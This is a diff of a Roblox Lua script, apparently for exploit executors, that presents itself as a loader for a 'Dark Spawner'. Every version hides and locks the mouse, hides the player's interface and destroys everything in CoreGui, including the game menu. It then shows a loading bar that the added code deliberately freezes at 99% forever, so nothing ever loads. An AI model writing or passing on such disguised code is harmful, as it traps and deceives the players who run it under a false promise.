@@ -1,13 +1,12 @@
--- Gộp Warning + Loading + Force Mouse Lock + GUI Cleaner
-
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
+-- ⚙️ Khóa chuột và ẩn chuột
 local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Ẩn chuột và khóa chuột giữa màn hình
 UserInputService.MouseIconEnabled = false
 RunService:BindToRenderStep("ForceMouseCenter", Enum.RenderPriority.Last.Value + 1, function()
     if UserInputService.MouseBehavior ~= Enum.MouseBehavior.LockCenter then
@@ -15,97 +14,19 @@ RunService:BindToRenderStep("ForceMouseCenter", Enum.RenderPriority.Last.Value +
     end
 end)
 
--- Ẩn tất cả GUI hiện có trong PlayerGui
+-- 🔒 Xoá/ẩn GUI có sẵn
 for _, v in pairs(playerGui:GetDescendants()) do
     if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and v.Visible then
         v.Visible = false
     end
 end
-
--- Thử xóa mọi thứ trong CoreGui
-local CoreGui = game:GetService("CoreGui")
 for _, v in pairs(CoreGui:GetDescendants()) do
     pcall(function() v:Destroy() end)
 end
 
--- ⚠️ Cảnh Báo Delta
-local function createDeltaWarning()
-    local warningGui = Instance.new("ScreenGui")
-    warningGui.Name = "DeltaWarning"
-    warningGui.ResetOnSpawn = false
-    warningGui.IgnoreGuiInset = true
-    warningGui.DisplayOrder = 999999998
-    warningGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    warningGui.Parent = playerGui
+-- 🌀 Loading Screen bắt đầu
+local TweenService = game:GetService("TweenService")
 
-    local bg = Instance.new("Frame")
-    bg.Size = UDim2.new(1, 0, 1, 0)
-    bg.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
-    bg.BorderSizePixel = 0
-    bg.ZIndex = 999999998
-    bg.Parent = warningGui
-
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 500, 0, 300)
-    frame.Position = UDim2.new(0.5, -250, 0.5, -150)
-    frame.BackgroundColor3 = Color3.fromRGB(40, 25, 25)
-    frame.BorderColor3 = Color3.fromRGB(200, 50, 50)
-    frame.BorderSizePixel = 2
-    frame.Parent = bg
-    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 15)
-
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 60)
-    title.Position = UDim2.new(0, 0, 0, 20)
-    title.BackgroundTransparency = 1
-    title.Text = "⚠️ INCOMPATIBILITY WARNING"
-    title.TextColor3 = Color3.fromRGB(255, 100, 100)
-    title.TextScaled = true
-    title.Font = Enum.Font.GothamBold
-    title.Parent = frame
-
-    local msg = Instance.new("TextLabel")
-    msg.Size = UDim2.new(1, -40, 0, 120)
-    msg.Position = UDim2.new(0, 20, 0, 90)
-    msg.BackgroundTransparency = 1
-    msg.Text = "DELTA EXECUTOR DETECTED\n\nThis script is not compatible with Delta.\nDelta users may experience crashes or errors.\n\nRecommended executors: Synapse X, Script-Ware"
-    msg.TextColor3 = Color3.fromRGB(220, 220, 220)
-    msg.TextScaled = true
-    msg.Font = Enum.Font.Gotham
-    msg.TextWrapped = true
-    msg.Parent = frame
-
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(0, 250, 0, 40)
-    btn.Position = UDim2.new(0.5, -125, 0, 240)
-    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
-    btn.Text = "Execute After Warning"
-    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    btn.TextScaled = true
-    btn.Font = Enum.Font.GothamMedium
-    btn.Parent = frame
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
-
-    btn.MouseEnter:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(80, 80, 100)
-    end)
-    btn.MouseLeave:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
-    end)
-
-    spawn(function()
-        while warningGui.Parent and title and title.Parent do
-            title.TextColor3 = Color3.fromRGB(255, 100, 100)
-            wait(0.8)
-            title.TextColor3 = Color3.fromRGB(255, 150, 150)
-            wait(0.8)
-        end
-    end)
-
-    return warningGui, btn
-end
-
--- 🔄 Màn Hình Loading
 local function createLoadingScreen()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "LoadingScreen"
@@ -115,115 +36,121 @@ local function createLoadingScreen()
     screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     screenGui.Parent = playerGui
 
-    local bg = Instance.new("Frame")
-    bg.Size = UDim2.new(1, 0, 1, 0)
-    bg.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-    bg.BorderSizePixel = 0
-    bg.ZIndex = 999999999
-    bg.Parent = screenGui
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(1, 0, 1, 0)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = screenGui
 
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 400, 0, 120)
-    frame.Position = UDim2.new(0.5, -200, 0.5, -60)
-    frame.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
-    frame.BorderSizePixel = 0
-    frame.Parent = bg
-    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+    local loadingFrame = Instance.new("Frame")
+    loadingFrame.Size = UDim2.new(0, 400, 0, 120)
+    loadingFrame.Position = UDim2.new(0.5, -200, 0.5, -60)
+    loadingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
+    loadingFrame.BorderSizePixel = 0
+    loadingFrame.Parent = mainFrame
 
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, -40, 0, 30)
-    title.Position = UDim2.new(0, 20, 0, 20)
-    title.BackgroundTransparency = 1
-    title.Text = "Loading Dark Spawner"
-    title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    title.TextScaled = true
-    title.Font = Enum.Font.GothamMedium
-    title.Parent = frame
+    Instance.new("UICorner", loadingFrame).CornerRadius = UDim.new(0, 12)
 
-    local percent = Instance.new("TextLabel")
-    percent.Size = UDim2.new(0, 60, 0, 25)
-    percent.Position = UDim2.new(1, -80, 0, 22)
-    percent.BackgroundTransparency = 1
-    percent.Text = "0%"
-    percent.TextColor3 = Color3.fromRGB(200, 200, 200)
-    percent.TextScaled = true
-    percent.Font = Enum.Font.Gotham
-    percent.Parent = frame
+    local loadingText = Instance.new("TextLabel")
+    loadingText.Size = UDim2.new(1, -40, 0, 30)
+    loadingText.Position = UDim2.new(0, 20, 0, 20)
+    loadingText.BackgroundTransparency = 1
+    loadingText.Text = "Loading Dark Spawner"
+    loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    loadingText.TextScaled = true
+    loadingText.Font = Enum.Font.GothamMedium
+    loadingText.Parent = loadingFrame
 
-    local barBg = Instance.new("Frame")
-    barBg.Size = UDim2.new(1, -40, 0, 8)
-    barBg.Position = UDim2.new(0, 20, 0, 70)
-    barBg.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
-    barBg.BorderSizePixel = 0
-    barBg.Parent = frame
-    Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 4)
+    local progressText = Instance.new("TextLabel")
+    progressText.Size = UDim2.new(0, 60, 0, 25)
+    progressText.Position = UDim2.new(1, -80, 0, 22)
+    progressText.BackgroundTransparency = 1
+    progressText.Text = "0%"
+    progressText.TextColor3 = Color3.fromRGB(200, 200, 200)
+    progressText.TextScaled = true
+    progressText.Font = Enum.Font.Gotham
+    progressText.Parent = loadingFrame
 
-    local fill = Instance.new("Frame")
-    fill.Size = UDim2.new(0, 0, 1, 0)
-    fill.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
-    fill.BorderSizePixel = 0
-    fill.Parent = barBg
-    Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 4)
+    local progressBg = Instance.new("Frame")
+    progressBg.Size = UDim2.new(1, -40, 0, 8)
+    progressBg.Position = UDim2.new(0, 20, 0, 70)
+    progressBg.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+    progressBg.BorderSizePixel = 0
+    progressBg.Parent = loadingFrame
 
-    local running = true
+    Instance.new("UICorner", progressBg).CornerRadius = UDim.new(0, 4)
+
+    local progressFill = Instance.new("Frame")
+    progressFill.Size = UDim2.new(0, 0, 1, 0)
+    progressFill.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
+    progressFill.BorderSizePixel = 0
+    progressFill.Parent = progressBg
+
+    Instance.new("UICorner", progressFill).CornerRadius = UDim.new(0, 4)
+
     local currentProgress = 0
+    local targetProgress = 0
+    local isStuck = false
+    local isRunning = true
+
+    local function updateProgress()
+        if not isStuck and isRunning then
+            if currentProgress < 90 then
+                targetProgress = math.min(currentProgress + math.random(5, 15), 90)
+            elseif currentProgress < 99 then
+                targetProgress = math.min(currentProgress + math.random(1, 3), 99)
+            else
+                targetProgress = 99
+                isStuck = true
+            end
+        end
+
+        local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+        TweenService:Create(
+            progressFill,
+            tweenInfo,
+            {Size = UDim2.new(targetProgress / 100, 0, 1, 0)}
+        ):Play()
+
+        if progressText then
+            progressText.Text = math.floor(targetProgress) .. "%"
+        end
+
+        currentProgress = targetProgress
+    end
 
     coroutine.wrap(function()
-        local dots = 0
-        while running and title and title.Parent do
-            dots = (dots + 1) % 4
-            title.Text = "Loading Dark Spawner" .. string.rep(".", dots)
+        local dotCount = 0
+        while isRunning and screenGui.Parent do
+            dotCount = (dotCount + 1) % 4
+            loadingText.Text = "Loading Dark Spawner" .. string.rep(".", dotCount)
             wait(0.5)
         end
     end)()
 
     coroutine.wrap(function()
         wait(1)
-        while currentProgress < 99 and running do
-            currentProgress = currentProgress + math.random(3, 10)
-            currentProgress = math.clamp(currentProgress, 0, 99)
-
-            TweenService:Create(fill, TweenInfo.new(0.5), {
-                Size = UDim2.new(currentProgress / 100, 0, 1, 0)
-            }):Play()
-
-            percent.Text = tostring(currentProgress) .. "%"
+        while currentProgress < 99 and isRunning and screenGui.Parent do
+            updateProgress()
             wait(math.random(1, 3))
         end
-
-        while running do
-            percent.Text = "100%"
-            fill.Size = UDim2.new(1, 0, 1, 0)
-            wait(0.1)
-            percent.Text = "99%"
-            fill.Size = UDim2.new(0.99, 0, 1, 0)
-            wait(math.random(3, 6))
+        while isRunning and screenGui.Parent do
+            wait(math.random(3, 8))
+            if isStuck then
+                progressText.Text = "100%"
+                progressFill.Size = UDim2.new(1, 0, 1, 0)
+                wait(0.1)
+                progressText.Text = "99%"
+                progressFill.Size = UDim2.new(0.99, 0, 1, 0)
+            end
         end
     end)()
-end
 
--- 🎬 Main
-local function main()
-    local warningGui, continueBtn = createDeltaWarning()
-    local clicked = false
-
-    local conn = continueBtn.MouseButton1Click:Connect(function()
-        clicked = true
-        conn:Disconnect()
+    screenGui.AncestryChanged:Connect(function()
+        if not screenGui.Parent then
+            isRunning = false
+        end
     end)
-
-    repeat wait(0.1) until clicked or not warningGui.Parent
-
-    if warningGui and warningGui.Parent then
-        TweenService:Create(warningGui.WarningBackground, TweenInfo.new(0.5), {
-            BackgroundTransparency = 1
-        }):Play()
-        wait(0.5)
-        warningGui:Destroy()
-    end
-
-    wait(0.3)
-    createLoadingScreen()
 end
 
-spawn(main)
+createLoadingScreen()
